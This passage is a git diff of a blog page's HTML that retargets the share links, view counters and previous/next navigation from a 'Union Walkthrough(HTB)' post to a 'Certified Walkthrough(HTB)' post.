-      href="https://api.whatsapp.com/send?text=http://localhost:1313/Secure-The-Throne/posts/1741809498520-union-walkthroughhtb/&amp;resubmit=true&amp;title=Union%20Walkthrough%28HTB%29"
+      href="https://api.whatsapp.com/send?text=http://localhost:1313/Secure-The-Throne/posts/1742035934336-certified-walkthroughhtb/&amp;resubmit=true&amp;title=Certified%20Walkthrough%28HTB%29"
       title="Share via WhatsApp"
       aria-label="Share via WhatsApp"
       >
@@ -1748,7 +1666,7 @@ uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://pinterest.com/pin/create/bookmarklet/?url=http://localhost:1313/Secure-The-Throne/posts/1741809498520-union-walkthroughhtb/&amp;description=Union%20Walkthrough%28HTB%29"
+      href="https://pinterest.com/pin/create/bookmarklet/?url=http://localhost:1313/Secure-The-Throne/posts/1742035934336-certified-walkthroughhtb/&amp;description=Certified%20Walkthrough%28HTB%29"
       title="Pin on Pinterest"
       aria-label="Pin on Pinterest"
       >
@@ -1767,7 +1685,7 @@ uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://reddit.com/submit/?url=http://localhost:1313/Secure-The-Throne/posts/1741809498520-union-walkthroughhtb/&amp;resubmit=true&amp;title=Union%20Walkthrough%28HTB%29"
+      href="https://reddit.com/submit/?url=http://localhost:1313/Secure-The-Throne/posts/1742035934336-certified-walkthroughhtb/&amp;resubmit=true&amp;title=Certified%20Walkthrough%28HTB%29"
       title="Submit to Reddit"
       aria-label="Submit to Reddit"
       >
@@ -1786,7 +1704,7 @@ uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:1313/Secure-The-Throne/posts/1741809498520-union-walkthroughhtb/&amp;quote=Union%20Walkthrough%28HTB%29"
+      href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:1313/Secure-The-Throne/posts/1742035934336-certified-walkthroughhtb/&amp;quote=Certified%20Walkthrough%28HTB%29"
       title="Share on Facebook"
       aria-label="Share on Facebook"
       >
@@ -1805,7 +1723,7 @@ uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="mailto:?body=http://localhost:1313/Secure-The-Throne/posts/1741809498520-union-walkthroughhtb/&amp;subject=Union%20Walkthrough%28HTB%29"
+      href="mailto:?body=http://localhost:1313/Secure-The-Throne/posts/1742035934336-certified-walkthroughhtb/&amp;subject=Certified%20Walkthrough%28HTB%29"
       title="Send via email"
       aria-label="Send via email"
       >
@@ -1834,8 +1752,8 @@ uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
           
         
       <script>
-        var oid = "views_posts\/1741809498520-Union-Walkthrough(HTB)\/index.md"
-        var oid_likes = "likes_posts\/1741809498520-Union-Walkthrough(HTB)\/index.md"
+        var oid = "views_posts\/1742035934336-Certified-Walkthrough(HTB)\/index.md"
+        var oid_likes = "likes_posts\/1742035934336-Certified-Walkthrough(HTB)\/index.md"
       </script>
       
       
@@ -1855,7 +1773,7 @@ uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/Secure-The-Throne/posts/1741762551259-caption-walkthroughhtb/">
+            <a class="flex group mr-3" href="/Secure-The-Throne/posts/1741808245229-perfection-walkthroughhtb/">
               <span
                 class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -1867,23 +1785,6 @@ uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Caption Walkthrough(HTB)</span
-                >
-                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
-                  
-                    <time datetime="2025-03-12T00:00:00&#43;00:00">12 March 2025</time>
-                  
-                </span>
-              </span>
-            </a>
-          
-        </span>
-        <span>
-          
-            <a class="flex text-right group ml-3" href="/Secure-The-Throne/posts/1741808245229-perfection-walkthroughhtb/">
-              <span class="flex flex-col">
-                <span
-                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                   >Perfection Walkthrough(HTB)</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
@@ -1892,15 +1793,10 @@ uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
                   
                 </span>
               </span>
-              <span
-                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
-                >&rarr;</span
-              >
-              <span
-                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
-                >&larr;</span
-              >
             </a>
+          
+        </span>
+        <span>
           
         </span>
       </div>
